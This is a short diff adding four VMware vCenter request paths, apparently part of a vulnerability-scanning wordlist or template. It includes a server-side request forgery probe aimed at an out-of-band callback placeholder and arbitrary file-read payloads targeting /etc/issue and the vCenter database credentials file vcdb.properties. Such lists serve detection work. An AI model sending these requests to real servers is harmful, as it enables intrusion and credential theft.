@@ -1,0 +1,4 @@
+/ui/vropspluginui/rest/services/getstatus
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
+/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+/eam/vib?id=/etc/issue
